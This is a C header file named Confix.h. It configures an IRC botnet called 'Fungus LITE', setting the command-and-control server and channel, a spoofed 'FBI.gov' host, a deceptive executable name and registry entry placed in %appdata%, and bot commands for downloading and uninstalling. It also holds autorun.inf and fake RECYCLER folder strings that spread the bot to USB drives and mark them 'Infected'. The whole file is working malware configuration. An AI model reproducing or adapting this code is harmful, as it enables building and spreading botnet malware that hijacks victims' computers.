/*
   ___                                           
 /'___\                                          
/\ \__/  __  __    ___      __   __  __    ____  
\ \ ,__\/\ \/\ \ /' _ `\  /'_ `\/\ \/\ \  /',__\  by Zax0mA
 \ \ \_/\ \ \_\ \/\ \/\ \/\ \L\ \ \ \_\ \/\__, `\
  \ \_\  \ \____/\ \_\ \_\ \____ \ \____/\/\____/ LITE 
   \/_/   \/___/  \/_/\/_/\/___L\ \/___/  \/___/ 
                            /\____/              
                            \_/__/     
							          
  Confix.h
  -> bot configuration
*/

#ifndef _confix_h_
#define _confix_h_
#include "externs.h"
/* DONT TOUCH */




/* Fungus Config */




ircconnect_s ircconnect[] =
{
//	{"irc.bluehell.org", 6667, ""},
	{"<3Stel128.servercenter.com", 6667, ""},
	{0, 0, 0}
};

char infochan[] = "#roots";
//char keylogchan[] = "#keylog2";

unsigned long cfg_reconnectsleep = 5000; // msec
unsigned long cfg_ircmaxwaittime = 600; // sec
int cfg_nicklen = 6;

char cfg_ircchannel[] = "#roots";
char cfg_ircchanpass[] = "";
char cfg_irchost[] = "FBI.gov";
char cfg_ircorderprefix[] = "!";



char cfg_filename[] = "system.exe";

char cfg_mutex[] = "-Mutex-";

char cfg_firewall_description[] = "Something that looks legit here";
char gotopth[] = "%appdata%";

char szRegname[] =  "Connection Guard";


/* COMMANDS */

char cmd_disconnect[] = "disconnect";
char cmd_reconnect[]  = "reconnect";
char cmd_remove[]     = "uninstall";
char cmd_sa[]         = "silent.all";
char cmd_sm[]         = "silent.main";
char cmd_download[]   = "dl.start";
/*char cmd_msn_text[]   = "msn.text";
char cmd_msn_file[]   = "msn.file";
char cmd_msn_stop[]   = "msn.stop";
char cmd_yim_text[]   = "yim.text";
char cmd_yim_file[]   = "yim.file";
char cmd_yim_stop[]   = "yim.stop";
char cmd_all_text[]   = "all.text";
char cmd_all_file[]   = "all.file";
char cmd_all_stop[]   = "all.stop";*/

/* USB SHIT */
char USB_STR_RECYCLER[]	     = "\\RECYCLER";
char USB_STR_REC_SUBDIR[]	     = "\\S-1-6-21-2434476501-1644491937-600003330-1213";
char USB_STR_DESKTOP_DATA[]	 = "[.ShellClassInfo]\r\nCLSID={645FF040-5081-101B-9F08-00AA002F954E}";
char USB_STR_DESKTOP_INI[]	 = "\\Desktop.ini";
char USB_STR_AUTORUN_INF[]	 = "\\autorun.inf";
char USB_STR_AUTORUN_DATA1[] = "[autorun]\r\nopen=";
char USB_STR_AUTORUN_DATA2[] = "\r\nicon=%SystemRoot%\\system32\\SHELL32.dll,4\r\naction=Open folder to view files\r\nshell\\open=Open\r\nshell\\open\\command=";
char USB_STR_AUTORUN_DATA3[] = "\r\nshell\\open\\default=1";
char USB_STR_INFECTED[]      = ".:[USB]:. Infected Drive ";



#endif